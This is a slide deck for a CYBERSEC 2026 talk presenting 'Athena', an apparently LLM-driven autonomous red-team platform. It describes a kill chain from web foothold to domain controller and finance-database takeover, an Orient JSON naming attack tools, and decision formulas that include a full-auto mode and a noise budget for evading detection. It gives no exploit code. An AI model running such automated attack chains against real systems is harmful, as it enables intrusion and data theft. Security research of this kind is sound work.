---
theme: default
title: 'AI 從小兵變指揮官 — CYBERSEC 2026'
info: |
  CYBERSEC 2026 — Harry Chen + Alex Chih
  Athena · OODA Red Team Platform · 30 min
class: 'text-center'
highlighter: shiki
lineNumbers: false
drawings:
  persist: false
mdc: true
colorSchema: 'dark'
transition: fade
fonts:
  sans: 'Noto Sans TC, Inter'
  mono: 'JetBrains Mono'
  serif: 'Noto Sans TC'
  weights: '300,400,500,600,700'
  provider: 'google'
layout: cover
---


<!-- Slide 1 from Harry's PPT — Cover · OPERATION ATHENA-433FC2 -->

<div class="op-header">
<span>// OPERATION ATHENA-433FC2</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div style="height: 100%; display: flex; flex-direction: column; align-items: flex-start; justify-content: center; padding: 0 4rem;">

<div style="font-size: 4.2rem; font-weight: 700; line-height: 1.15; max-width: 56rem; text-align: left;">
AI 從小兵變<span style="color: var(--accent-orange);">指揮官</span>
</div>

<div style="font-size: 1.8rem; font-weight: 500; line-height: 1.4; margin-top: 1.4rem; color: var(--accent-green);">
擊殺鏈如何從工具箱進化為核彈
</div>

<div style="margin-top: 2rem; width: 6rem; height: 3px; background: var(--accent-orange);"></div>

<div style="margin-top: 1rem; color: var(--fg-dim); font-size: 1rem;">
Harry Chen &nbsp;·&nbsp; Alex Chih &nbsp;|&nbsp; 2026/05/07 &nbsp;|&nbsp; CYBERSEC 2026
</div>

<div style="position: absolute; bottom: 2rem; right: 2rem;">
<span class="status compromised">18m57s · 全自動滲透 · 全滅</span>
</div>

</div>

---
transition: fade
---

<!-- Slide 2 from Harry's PPT — Speaker · Harry Chen -->

<div class="op-header">
<span>// SPEAKER-PROFILE-01/02 · AGENT_01 :: HARRY_CHEN</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div style="display: grid; grid-template-columns: 1fr 1.6fr; gap: 2.4rem; margin-top: 1.6rem; align-items: start;">

<div style="border: 2px solid var(--accent-green); border-radius: 4px; overflow: hidden; aspect-ratio: 4/5; background: var(--bg-elev);">
<img src="/image1.png" alt="Harry Chen" style="width: 100%; height: 100%; object-fit: cover;" />
</div>

<div>

<div class="slide-eyebrow">// AGENT_01 · HARRY_CHEN</div>

<div style="font-size: 3.2rem; font-weight: 700; color: white; line-height: 1.1; margin-top: 0.4rem;">
陳齊修
</div>

<div style="font-size: 1.4rem; font-weight: 500; color: var(--accent-green); margin-top: 0.8rem;">
紅隊主管 / 網路中文資訊股份有限公司
</div>

<div style="margin-top: 1rem; width: 4rem; height: 3px; background: var(--accent-green);"></div>

<div style="margin-top: 1.4rem; font-size: 1.05rem; line-height: 1.9; color: var(--fg);">

- 前政府機關紅隊組長，數十次政府機關實戰滲透
- CYBERSEC 講者（2024）
- 零信任架構研發主管 → 現多間企業資安顧問
- 專長：紅隊演練 / 後滲透 / AI 攻防自動化

</div>

</div>

</div>

---
transition: fade
---

<!-- Slide 3 from Harry's PPT — Speaker · Alex Chih (TODO placeholder) -->

<div class="op-header">
<span>// SPEAKER-PROFILE-02/02 · AGENT_02 :: ALEX_CHIH</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div style="display: grid; grid-template-columns: 1fr 1.6fr; gap: 2.4rem; margin-top: 1.6rem; align-items: start;">

<div style="border: 2px solid var(--accent-green); border-radius: 4px; aspect-ratio: 4/5; background: var(--bg-elev); display: flex; align-items: center; justify-content: center; font-family: 'JetBrains Mono', monospace; color: var(--accent-green); font-size: 1rem;">
[ PHOTO ]
</div>

<div>

<div class="slide-eyebrow">// AGENT_02 · ALEX_CHIH</div>

<div style="font-size: 3.2rem; font-weight: 700; color: white; line-height: 1.1; margin-top: 0.4rem;">
<!-- TODO: Alex profile (姓名) -->
講者姓名
</div>

<div style="font-size: 1.4rem; font-weight: 500; color: var(--accent-green); margin-top: 0.8rem;">
<!-- TODO: Alex profile (職稱 / 公司) -->
職稱 / 公司
</div>

<div style="margin-top: 1rem; width: 4rem; height: 3px; background: var(--accent-green);"></div>

<div style="margin-top: 1.4rem; font-size: 1.05rem; line-height: 1.9; color: var(--fg);">

<!-- TODO: Alex profile — 三點經歷 + 專長 -->
- 經歷一
- 經歷二
- 經歷三
- 專長領域

</div>

</div>

</div>

---
transition: fade
---

<!-- Slide 4 from Harry's PPT — Three Doctrines (Prologue) -->

<div class="slide-eyebrow">// THE THREE DOCTRINES :: PROLOGUE</div>
<div class="slide-h1">三條信條 — 整場簡報的鼓點</div>

<div class="numbered-lines" style="margin-top: 1.6rem;">

<div class="numbered-line">
<div class="n">1</div>
<div class="body">
<div style="font-family: 'JetBrains Mono', monospace; color: var(--accent-green); font-weight: 700; font-size: 0.95rem; letter-spacing: 0.08em;">FACT-DRIVEN</div>
<div style="font-size: 1.4rem; font-weight: 700; margin-top: 0.2rem;">AI 不靠直覺，靠寫進 Facts DB 的事實</div>
<div style="font-size: 0.95rem; color: var(--fg-dim); margin-top: 0.3rem;">每一個推薦都引用 fact · 每一次失敗都寫回歷史 · LLM 信心要過校正</div>
</div>
</div>

<div class="numbered-line">
<div class="n">2</div>
<div class="body">
<div style="font-family: 'JetBrains Mono', monospace; color: var(--accent-green); font-weight: 700; font-size: 0.95rem; letter-spacing: 0.08em;">DOCTRINE BEATS TOOLS</div>
<div style="font-size: 1.4rem; font-weight: 700; margin-top: 0.2rem;">武器庫人人有，差別在 doctrine</div>
<div style="font-size: 0.95rem; color: var(--fg-dim); margin-top: 0.3rem;">OODA × C5ISR 雙框架 · 17 個 MCP 工具是肌肉，不是大腦</div>
</div>
</div>

<div class="numbered-line">
<div class="n">3</div>
<div class="body">
<div style="font-family: 'JetBrains Mono', monospace; color: var(--accent-green); font-weight: 700; font-size: 0.95rem; letter-spacing: 0.08em;">TEMPO IS THE WEAPON</div>
<div style="font-size: 1.4rem; font-weight: 700; margin-top: 0.2rem;">速度差 30 倍不是更快，是換了一個維度</div>
<div style="font-size: 0.95rem; color: var(--fg-dim); margin-top: 0.3rem;">30s/loop · 平行 kill chain · 失敗不痛、隨時回頭</div>
</div>
</div>

</div>

<div class="bridge-bottom" style="font-style: italic;">
接下來 50 張投影片，每一頁都在敲這三個鼓點。
</div>

---
transition: fade
---

<!-- Slide 5 from Harry's PPT — Mission Briefing · Agenda -->

<div class="slide-eyebrow">// MISSION BRIEFING :: AGENDA</div>
<div class="slide-h1">今天的攻擊路徑 — 6 個階段</div>

<table class="matrix" style="margin-top: 1.4rem;">
<thead>
<tr>
<th style="width: 6%">#</th>
<th style="width: 18%">Chapter</th>
<th style="width: 25%">主題</th>
<th style="width: 41%">內容</th>
<th style="width: 10%">時長</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong style="color: var(--accent-green); font-family: 'JetBrains Mono', monospace;">01</strong></td>
<td><strong>TRADITION</strong></td>
<td>傳統紅隊的瓶頸</td>
<td>為什麼 nmap × 經驗值已經不夠 · 5 張</td>
<td><span style="color: var(--fg-dim); font-family: 'JetBrains Mono', monospace;">~5 min</span></td>
</tr>
<tr>
<td><strong style="color: var(--accent-green); font-family: 'JetBrains Mono', monospace;">02</strong></td>
<td><strong>DOCTRINE</strong></td>
<td>軍事理論的紅隊化</td>
<td>C5ISR · OODA · Boyd 的 30 倍交換比 · 4 張</td>
<td><span style="color: var(--fg-dim); font-family: 'JetBrains Mono', monospace;">~6 min</span></td>
</tr>
<tr>
<td><strong style="color: var(--accent-green); font-family: 'JetBrains Mono', monospace;">03</strong></td>
<td><strong>ARCHITECTURE</strong></td>
<td>Athena 的引擎</td>
<td>Orient JSON / 17 個 MCP / fact-driven · 6 張</td>
<td><span style="color: var(--fg-dim); font-family: 'JetBrains Mono', monospace;">~10 min</span></td>
</tr>
<tr>
<td><strong style="color: var(--accent-green); font-family: 'JetBrains Mono', monospace;">04</strong></td>
<td><strong>FRAMEWORK</strong></td>
<td>作戰準則五階段</td>
<td>OBSERVE / ORIENT / DECIDE / ACT / TEMPO · 7 張</td>
<td><span style="color: var(--fg-dim); font-family: 'JetBrains Mono', monospace;">~8 min</span></td>
</tr>
<tr>
<td><strong style="color: var(--accent-green); font-family: 'JetBrains Mono', monospace;">05</strong></td>
<td><strong>OPERATION</strong></td>
<td>實戰 — 三個 stage 的 kill chain</td>
<td>WEB01 → DC-01 → ACCT-DB · 24 張</td>
<td><span style="color: var(--fg-dim); font-family: 'JetBrains Mono', monospace;">~15 min</span></td>
</tr>
<tr>
<td><strong style="color: var(--accent-green); font-family: 'JetBrains Mono', monospace;">06</strong></td>
<td><strong>AFTER ACTION</strong></td>
<td>戰場心得 + 下一步</td>
<td>三個收穫 · roadmap · 對比同類 · 5 張</td>
<td><span style="color: var(--fg-dim); font-family: 'JetBrains Mono', monospace;">~6 min</span></td>
</tr>
</tbody>
</table>

<div class="bridge-bottom">
總長 ~50 分鐘 · <strong>重點不在工具，在三條信條。</strong>
</div>

---
transition: fade
---

<!-- Slide 6 from Harry's PPT — Chapter 1 · Traditional Kill Chain -->

<div class="slide-eyebrow">// TRADITIONAL / WORKFLOW · Page 02</div>
<div class="slide-h1">滲透測試 Kill Chain</div>

<div class="kill-chain compact" style="margin: 2rem 0;">

<div class="kc-node recon">
<div class="label">偵察</div>
<div class="sub">RECON</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node recon">
<div class="label">突破</div>
<div class="sub">BREACH</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node exploit">
<div class="label">立足</div>
<div class="sub">FOOTHOLD</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node exploit">
<div class="label">橫向</div>
<div class="sub">PIVOT</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node attacker">
<div class="label">收割</div>
<div class="sub">LOOT</div>
</div>

</div>

<div style="display: flex; justify-content: space-around; margin-top: -0.6rem; margin-bottom: 1.2rem; font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--fg-dim); letter-spacing: 0.1em;">
<span>OODA</span><span>OODA</span><span>OODA</span><span>OODA</span>
</div>

<div class="alert-box">
每一階段，<strong>AI 都用 OODA 迴圈快速決策</strong> — 我們今天會在 20 分鐘內走完整條鏈。
</div>

---
transition: fade
---

<!-- Slide 7 from Harry's PPT — 每一階段在做什麼 -->

<div class="slide-eyebrow">// TRADITIONAL / LIMITS · Page 03</div>
<div class="slide-h1">每一階段在做什麼</div>

<div class="numbered-lines" style="margin-top: 1.6rem;">

<div class="numbered-line">
<div class="n" style="color: var(--accent-green);">01</div>
<div class="body">
<div style="font-size: 1.4rem; font-weight: 700;">偵察 → 突破</div>
<div style="font-size: 1rem; color: var(--fg); margin-top: 0.4rem; line-height: 1.6;">掃描對外服務、找出 IIS / ASP.NET 入口，從 Web 弱點打進第一台機器（<code>WEB01</code>）。</div>
</div>
</div>

<div class="numbered-line">
<div class="n" style="color: var(--accent-orange);">02</div>
<div class="body">
<div style="font-size: 1.4rem; font-weight: 700;">立足 → 橫向移動</div>
<div style="font-size: 1rem; color: var(--fg); margin-top: 0.4rem; line-height: 1.6;">建立 C2 通道、抽 AD 帳號清單、用 AS-REP Roasting / Kerberoast 拿到網域票證。</div>
</div>
</div>

<div class="numbered-line">
<div class="n" style="color: var(--accent-red);">03</div>
<div class="body">
<div style="font-size: 1.4rem; font-weight: 700;">收割資料</div>
<div style="font-size: 1rem; color: var(--fg); margin-top: 0.4rem; line-height: 1.6;">取得 DC 與 <code>ACCT-DB01</code> 控制權，匯出財務 MSSQL 資料、AD 帳號雜湊，完成任務。</div>
</div>
</div>

</div>

<div class="bridge-bottom" style="text-align: center;">
傳統紅隊一週的工作量 ─ <strong>AI 在 20 分鐘內全程自走</strong>。
</div>

---
transition: fade
---

<!-- Slide 8 from Harry's PPT — 軍事作戰遇到過同樣的問題 -->

<div class="slide-eyebrow">// MILITARY / ANALOG · Page 04</div>
<div class="slide-h1">軍事作戰遇到過同樣的問題</div>

<div class="compare-2" style="margin-top: 1.8rem;">

<div class="side red-border">
<div class="head" style="font-family: 'JetBrains Mono', monospace; color: var(--accent-red); font-size: 0.9rem; letter-spacing: 0.1em;">▌ 二戰前</div>
<div style="font-size: 1.6rem; font-weight: 700; color: white; margin: 0.6rem 0 1rem;">各兵種各自為政</div>
<div class="body" style="font-size: 1rem; line-height: 1.9;">
海軍、陸軍、空軍情報不共享<br/>
敵情判讀靠各兵種獨立蒐集<br/>
戰場決策延遲，常常打到自己人<br/>
勝負取決於最弱的那個兵種
</div>
</div>

<div class="center">↔</div>

<div class="side green-border">
<div class="head" style="font-family: 'JetBrains Mono', monospace; color: var(--accent-green); font-size: 0.9rem; letter-spacing: 0.1em;">▌ 戰後解法</div>
<div style="font-size: 1.6rem; font-weight: 700; color: white; margin: 0.6rem 0 1rem;">C2 → C5ISR</div>
<div class="body" style="font-size: 1rem; line-height: 1.9;">
Command &amp; Control（指揮與控制）<br/>
統一指揮、統一情報、統一通訊<br/>
後續演化納入 Computers / Cyber<br/>
從「兵種協同」進化為「作戰體系」
</div>
</div>

</div>

<div class="bridge-bottom">
<strong style="color: var(--accent-orange);">軍事先解決了這個問題，我們直接借用。</strong>
</div>

---
layout: cover
class: 'text-center'
---

<!-- Slide 9 from Harry's PPT — Chapter 02 cover · DOCTRINE -->

<div style="height: 100%; display: grid; grid-template-columns: 1fr 1.4fr; gap: 3rem; align-items: center; padding: 0 4rem;">

<div style="text-align: left;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 16rem; font-weight: 700; color: var(--accent-green); line-height: 0.9;">
02
</div>
</div>

<div style="text-align: left;">

<div class="slide-eyebrow" style="margin-bottom: 1rem;">// CHAPTER 02 :: DOCTRINE</div>

<div style="font-size: 2.8rem; font-weight: 700; line-height: 1.25; color: white;">
從天上的空戰，<br/>到鍵盤上的紅隊
</div>

<div style="margin-top: 1.4rem; width: 4rem; height: 3px; background: var(--accent-green);"></div>

<div style="margin-top: 1.4rem; font-size: 1.1rem; line-height: 1.85; color: var(--fg);">
軍事八十年的學費，三條 doctrine 收齊：<br/>
C5ISR 是組織骨架、OODA 是節拍器、tempo 是勝負手。
</div>

<div style="margin-top: 1.2rem; font-size: 1.1rem; font-weight: 700; color: var(--accent-green);">
接下來三張，把它變成 LLM 看得懂的東西。
</div>

</div>

</div>

---
transition: fade
zoom: 0.88
---

<!-- Slide 10 from Harry's PPT — C5ISR 是什麼 (8-grid) -->

<div class="slide-eyebrow">// C5ISR / DOCTRINE · Page 05</div>
<div class="slide-h1">C5ISR 是什麼</div>

<table class="matrix" style="margin-top: 1.4rem;">
<thead>
<tr>
<th style="width: 9%; text-align: center;">字母</th>
<th style="width: 28%;">英文</th>
<th style="width: 28%;">中文</th>
<th>軍事意義</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center; font-family: 'JetBrains Mono', monospace; font-size: 1.4rem; font-weight: 700; color: var(--accent-green);">C</td>
<td><strong style="color: var(--accent-orange); font-family: 'JetBrains Mono', monospace;">Command</strong></td>
<td><strong>指揮決策</strong></td>
<td>誰下命令、依據什麼下</td>
</tr>
<tr>
<td style="text-align: center; font-family: 'JetBrains Mono', monospace; font-size: 1.4rem; font-weight: 700; color: var(--accent-green);">C</td>
<td><strong style="color: var(--accent-orange); font-family: 'JetBrains Mono', monospace;">Control</strong></td>
<td><strong>執行控制</strong></td>
<td>命令下去後怎麼追蹤、怎麼煞車</td>
</tr>
<tr>
<td style="text-align: center; font-family: 'JetBrains Mono', monospace; font-size: 1.4rem; font-weight: 700; color: var(--accent-green);">C</td>
<td><strong style="color: var(--accent-orange); font-family: 'JetBrains Mono', monospace;">Communications</strong></td>
<td><strong>情報傳遞</strong></td>
<td>各單位之間怎麼通訊、廣播</td>
</tr>
<tr>
<td style="text-align: center; font-family: 'JetBrains Mono', monospace; font-size: 1.4rem; font-weight: 700; color: var(--accent-green);">C</td>
<td><strong style="color: var(--accent-orange); font-family: 'JetBrains Mono', monospace;">Computers</strong></td>
<td><strong>自動化處理</strong></td>
<td>把人力做不來的算給機器</td>
</tr>
<tr>
<td style="text-align: center; font-family: 'JetBrains Mono', monospace; font-size: 1.4rem; font-weight: 700; color: var(--accent-green);">C</td>
<td><strong style="color: var(--accent-orange); font-family: 'JetBrains Mono', monospace;">Cyber</strong></td>
<td><strong>網路戰能力</strong></td>
<td>第五個 C — 數位戰場的火力</td>
</tr>
<tr>
<td style="text-align: center; font-family: 'JetBrains Mono', monospace; font-size: 1.4rem; font-weight: 700; color: var(--accent-green);">I</td>
<td><strong style="color: var(--accent-orange); font-family: 'JetBrains Mono', monospace;">Intelligence</strong></td>
<td><strong>情報分析</strong></td>
<td>把雜訊變成可行動的判斷</td>
</tr>
<tr>
<td style="text-align: center; font-family: 'JetBrains Mono', monospace; font-size: 1.4rem; font-weight: 700; color: var(--accent-green);">S</td>
<td><strong style="color: var(--accent-orange); font-family: 'JetBrains Mono', monospace;">Surveillance</strong></td>
<td><strong>持續監視</strong></td>
<td>不間斷盯著戰場變化</td>
</tr>
<tr>
<td style="text-align: center; font-family: 'JetBrains Mono', monospace; font-size: 1.4rem; font-weight: 700; color: var(--accent-green);">R</td>
<td><strong style="color: var(--accent-orange); font-family: 'JetBrains Mono', monospace;">Reconnaissance</strong></td>
<td><strong>主動偵察</strong></td>
<td>派人/派工具過去摸清楚</td>
</tr>
</tbody>
</table>

<div class="bridge-bottom" style="font-style: italic;">
這八個字就是 Athena 的設計藍圖 — 下一張一格一格對給你看 →
</div>

---
transition: fade
---

<!-- Slide 11 from Harry's PPT — C5ISR → Athena 對應表 -->

<div class="slide-eyebrow">// C5ISR / MAPPING · Page 06</div>
<div class="slide-h1">C5ISR → Athena 對應</div>

<table class="matrix" style="margin-top: 1.6rem;">
<thead>
<tr>
<th style="width: 28%;">軍事 C5ISR</th>
<th>Athena 實作</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong style="color: var(--accent-orange); font-family: 'JetBrains Mono', monospace;">Reconnaissance</strong></td>
<td><code>nmap</code> / <code>web-scanner</code> MCP</td>
</tr>
<tr>
<td><strong style="color: var(--accent-orange); font-family: 'JetBrains Mono', monospace;">Surveillance</strong></td>
<td>OODA loop 持續偵察（每 30 秒）</td>
</tr>
<tr>
<td><strong style="color: var(--accent-orange); font-family: 'JetBrains Mono', monospace;">Intelligence</strong></td>
<td>Facts DB（ports / credentials / vulns）</td>
</tr>
<tr>
<td><strong style="color: var(--accent-orange); font-family: 'JetBrains Mono', monospace;">Computers</strong></td>
<td>MCP 工具執行層（17 個 server）</td>
</tr>
<tr>
<td><strong style="color: var(--accent-orange); font-family: 'JetBrains Mono', monospace;">Command</strong></td>
<td>LLM Orient：分析 kill chain，輸出建議技術</td>
</tr>
<tr>
<td><strong style="color: var(--accent-orange); font-family: 'JetBrains Mono', monospace;">Control</strong></td>
<td>Decision Engine：信心值 × 風險門檻</td>
</tr>
<tr>
<td><strong style="color: var(--accent-orange); font-family: 'JetBrains Mono', monospace;">Communications</strong></td>
<td>WebSocket 即時廣播 + War Room</td>
</tr>
<tr>
<td><strong style="color: var(--accent-orange); font-family: 'JetBrains Mono', monospace;">Cyber</strong></td>
<td>實際漏洞利用（<code>certipy</code> / <code>impacket</code> / <code>hashcat</code>）</td>
</tr>
</tbody>
</table>

<div class="bridge-bottom" style="font-style: italic;">
C5ISR 對應完了 — 下一張回到節奏：Boyd 的 OODA →
</div>

---
transition: fade
---

<!-- Slide 12 from Harry's PPT — Boyd's OODA Loop -->

<div class="slide-eyebrow">// OODA / BOYD · Page 07</div>
<div class="slide-h1">博伊德的 OODA Loop</div>

<div class="compare-2" style="margin-top: 1.8rem;">

<div class="side green-border">
<div class="head" style="font-family: 'JetBrains Mono', monospace; color: var(--accent-green); font-size: 0.9rem; letter-spacing: 0.1em;">▌ JOHN BOYD</div>
<div style="font-size: 1.5rem; font-weight: 700; color: white; margin: 0.6rem 0 0.8rem;">F-86 飛行員 → 戰術理論家</div>
<div class="body" style="font-size: 1rem; line-height: 1.9;">
韓戰美軍 F-86 vs MiG-15<br/>
<span style="color: var(--fg-dim);">• MiG 速度快、火力強</span><br/>
<span style="color: var(--accent-green);">• F-86 卻贏 10:1 交換比</span><br/><br/>
Boyd 把 F-86 的勝利拆成四個動作：<br/>
<strong>看見 — 判斷 — 決定 — 行動</strong>
</div>
</div>

<div class="center">→</div>

<div class="side green-border">
<div class="head" style="font-family: 'JetBrains Mono', monospace; color: var(--accent-orange); font-size: 0.9rem; letter-spacing: 0.1em;">▌ OODA</div>
<div style="font-size: 1.5rem; font-weight: 700; color: white; margin: 0.6rem 0 0.8rem;">節拍器，不是流程圖</div>

<div class="cmd-list" style="font-size: 1rem; margin-top: 0.4rem;">
<div class="cmd-row"><span style="color: var(--accent-green); font-weight: 700;">●</span> <strong>Observe</strong> — 把外界訊號收進來</div>
<div class="cmd-row"><span style="color: var(--accent-green); font-weight: 700;">●</span> <strong>Orient</strong> — 用脈絡解讀</div>
<div class="cmd-row"><span style="color: var(--accent-green); font-weight: 700;">●</span> <strong>Decide</strong> — 在不確定下選一條</div>
<div class="cmd-row"><span style="color: var(--accent-green); font-weight: 700;">●</span> <strong>Act</strong> — 立即執行、立刻收回饋</div>
</div>

</div>

</div>

<div class="bridge-bottom" style="font-style: italic;">
Boyd 在天上證明過了 — 接下來看它在 LLM 裡長什麼樣 →
</div>

---
transition: fade
---

<!-- Slide 13 from Harry's PPT — Athena 怎麼跑 OODA -->

<div class="slide-eyebrow">// STAGE / OODA · Page 08</div>
<div class="slide-h1">引擎骨架 — Athena 怎麼跑 OODA</div>

<div class="kill-chain compact" style="margin: 1.8rem 0;">

<div class="kc-node recon">
<div class="label">OBSERVE</div>
<div class="sub">觀察</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node exploit">
<div class="label">ORIENT</div>
<div class="sub">判斷</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node exploit">
<div class="label">DECIDE</div>
<div class="sub">決策</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node attacker">
<div class="label">ACT</div>
<div class="sub">行動</div>
</div>

</div>

<div class="numbered-lines" style="margin-top: 1.2rem;">

<div class="numbered-line">
<div class="n" style="color: var(--accent-green);">O</div>
<div class="body">
<div style="font-size: 1.15rem; font-weight: 700;">OBSERVE — 觀察</div>
<div style="font-size: 0.95rem; color: var(--fg-dim); margin-top: 0.2rem;">MCP 工具回傳 → 寫入 PostgreSQL Facts DB</div>
</div>
</div>

<div class="numbered-line">
<div class="n" style="color: var(--accent-green);">O</div>
<div class="body">
<div style="font-size: 1.15rem; font-weight: 700;">ORIENT — 判斷</div>
<div style="font-size: 0.95rem; color: var(--fg-dim); margin-top: 0.2rem;">Claude LLM 讀取 facts → 輸出 <code>recommended_technique + confidence</code></div>
</div>
</div>

<div class="numbered-line">
<div class="n" style="color: var(--accent-orange);">D</div>
<div class="body">
<div style="font-size: 1.15rem; font-weight: 700;">DECIDE — 決策</div>
<div style="font-size: 0.95rem; color: var(--fg-dim); margin-top: 0.2rem;"><code>interval=30s</code> · <code>AUTO_FULL</code> · <code>risk_threshold=medium</code></div>
</div>
</div>

<div class="numbered-line">
<div class="n" style="color: var(--accent-red);">A</div>
<div class="body">
<div style="font-size: 1.15rem; font-weight: 700;">ACT — 行動</div>
<div style="font-size: 0.95rem; color: var(--fg-dim); margin-top: 0.2rem;"><code>engine_router</code> → MCP 執行 → 回寫 Facts DB → 進入下一輪</div>
</div>
</div>

</div>

---
layout: cover
class: 'text-center'
---

<!-- Slide 14 from Harry's PPT — Chapter 03 cover · ARCHITECTURE -->

<div style="height: 100%; display: grid; grid-template-columns: 1fr 1.4fr; gap: 3rem; align-items: center; padding: 0 4rem;">

<div style="text-align: left;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 16rem; font-weight: 700; color: var(--accent-green); line-height: 0.9;">
03
</div>
</div>

<div style="text-align: left;">

<div class="slide-eyebrow" style="margin-bottom: 1rem;">// CHAPTER 03 :: ARCHITECTURE</div>

<div style="font-size: 2.8rem; font-weight: 700; line-height: 1.25; color: white;">
理論結束 —<br/>給你看 <span style="color: var(--accent-green); font-family: 'JetBrains Mono', monospace;">code</span>
</div>

<div style="margin-top: 1.4rem; width: 4rem; height: 3px; background: var(--accent-green);"></div>

<div style="margin-top: 1.4rem; font-size: 1.1rem; line-height: 1.85; color: var(--fg);">
下面七張是引擎室。<br/>
OODA 是骨架、Orient 是 JSON、Decide 是公式、<br/>
Tools 是 sandbox、Routing 是動態路由。
</div>

<div style="margin-top: 1.2rem; font-size: 1.1rem; font-weight: 700; color: var(--accent-orange);">
你會看到 <code>confidence 0.87</code> 在哪一行算出來。
</div>

</div>

</div>

---
transition: fade
zoom: 0.93
---

<!-- Slide 15 from Harry's PPT — Orient JSON output -->

<div class="op-header">
<span>// OPERATION ATHENA-ORIENT</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="slide-eyebrow">// ORIENT / OUTPUT · Page 09</div>
<div class="slide-h1">Orient 的輸出 — 一份 JSON 看清楚</div>

<div class="slide-sub">LLM 讀完 facts，吐回的就是這份結構化判斷 — 每一個 confidence 都對得起一條 fact。</div>

```json
{
  "recommended_technique_id": "T1558.004",
  "confidence": 0.87,
  "situation_assessment":
    "WEB01 已攻陷, AS-REP Roast 可零憑證執行",
  "options": [
    {"technique": "T1558.004",
     "mcp_tool":  "impacket-ad:asrep_roast",
     "confidence": 0.87},
    {"technique": "T1649",
     "mcp_tool":  "certipy-ad:certipy_request",
     "confidence": 0.71},
    {"technique": "T1046",
     "mcp_tool":  "nmap-scanner:port_scan",
     "confidence": 0.60}
  ]
}
```

<div class="alert-box">
看到那個 <span class="status elevated">0.87</span> 了嗎？ — 下一張告訴你它怎麼算出來的 →
</div>

---
transition: fade
---

<!-- Slide 16 from Harry's PPT — Decision Engine 三道閥 -->

<div class="slide-eyebrow">// DECIDE / ENGINE · Page 10</div>
<div class="slide-h1">Decision Engine — 三道閥決定下一步</div>

<div class="numbered-lines" style="margin-top: 1.6rem;">

<div class="numbered-line">
<div class="n">01</div>
<div class="body">
<div style="font-size: 1.3rem; font-weight: 700;">composite confidence</div>
<div style="font-family: 'JetBrains Mono', monospace; color: var(--accent-green); font-size: 0.95rem; margin-top: 0.4rem;">LLM_confidence × validation_score × history_success_rate</div>
<div style="font-size: 0.95rem; color: var(--fg-dim); margin-top: 0.3rem;">把單一信心值放進歷史與驗證的脈絡，避免過度自信。</div>
</div>
</div>

<div class="numbered-line">
<div class="n">02</div>
<div class="body">
<div style="font-size: 1.3rem; font-weight: 700;">risk_threshold matrix</div>
<div style="font-family: 'JetBrains Mono', monospace; color: var(--accent-green); font-size: 0.95rem; margin-top: 0.4rem;">{ LOW · MEDIUM · HIGH · CRITICAL } × noise_level</div>
<div style="font-size: 0.95rem; color: var(--fg-dim); margin-top: 0.3rem;">矩陣決定 <code>auto_approved</code>，超門檻退回人工確認。</div>
</div>
</div>

<div class="numbered-line">
<div class="n">03</div>
<div class="body">
<div style="font-size: 1.3rem; font-weight: 700;">noise_budget</div>
<div style="font-family: 'JetBrains Mono', monospace; color: var(--accent-green); font-size: 0.95rem; margin-top: 0.4rem;">noise_budget −= action.noise_cost</div>
<div style="font-size: 0.95rem; color: var(--fg-dim); margin-top: 0.3rem;">每次執行扣點，預算耗盡自動停止行動，控制偵測風險。</div>
</div>
</div>

</div>

<div class="bridge-bottom" style="font-style: italic;">
Decide 不是黑盒 — 下一張拆開 confidence 的三個來源 →
</div>

---
transition: fade
---

<!-- Slide 17 from Harry's PPT — 0.87 怎麼算的（confidence 拆解） -->

<div class="slide-eyebrow">// DECIDE / DETAIL · Page 10b</div>
<div class="slide-h1">0.87 怎麼算的 — 拆解 confidence</div>

<div class="numbered-lines" style="margin-top: 1.6rem;">

<div class="numbered-line">
<div class="n">01</div>
<div class="body">
<div style="font-size: 1.2rem; font-weight: 700;">validation_score — tool 執行回饋</div>
<div style="font-size: 0.95rem; color: var(--fg); margin-top: 0.4rem; line-height: 1.7;"><code>exit_code == 0 ? 1.0 : 0.0</code>；再加 <code>fact_diff</code>（有無寫入新 facts）權重 0.5。</div>
<div style="font-family: 'JetBrains Mono', monospace; color: var(--accent-orange); font-size: 0.85rem; margin-top: 0.3rem; background: var(--bg-elev); padding: 0.4rem 0.6rem; border-radius: 3px;">score = 0.5 × exit_ok + 0.5 × (new_facts &gt; 0)</div>
</div>
</div>

<div class="numbered-line">
<div class="n">02</div>
<div class="body">
<div style="font-size: 1.2rem; font-weight: 700;">history_success_rate — 同 technique 累計成功率</div>
<div style="font-size: 0.95rem; color: var(--fg); margin-top: 0.4rem; line-height: 1.7;">PostgreSQL 查近 N=50 次同 ATT&amp;CK ID 的成功率；冷啟動用 <code>prior=0.5</code>（Beta(1,1)）。</div>
<div style="font-family: 'JetBrains Mono', monospace; color: var(--accent-orange); font-size: 0.85rem; margin-top: 0.3rem; background: var(--bg-elev); padding: 0.4rem 0.6rem; border-radius: 3px;">rate = (success + 1) / (total + 2)   # Laplace smoothing</div>
</div>
</div>

<div class="numbered-line">
<div class="n">03</div>
<div class="body">
<div style="font-size: 1.2rem; font-weight: 700;">防過度自信 — calibration clamp</div>
<div style="font-size: 0.95rem; color: var(--fg); margin-top: 0.4rem; line-height: 1.7;">LLM 回 0.95 但歷史 0.4 → composite 取兩者幾何平均，避免 LLM 樂觀偏差。</div>
<div style="font-family: 'JetBrains Mono', monospace; color: var(--accent-orange); font-size: 0.85rem; margin-top: 0.3rem; background: var(--bg-elev); padding: 0.4rem 0.6rem; border-radius: 3px;">composite = (LLM × validation × history)^(1/3)</div>
</div>
</div>

</div>

<div class="alert-box">
校正後 Brier score 從 <strong>0.31 降到 0.12</strong>（demo 環境 200 輪樣本）。
</div>

---
transition: fade
zoom: 0.94
---

<!-- Slide 18 from Harry's PPT — 17 個 MCP 工具 -->

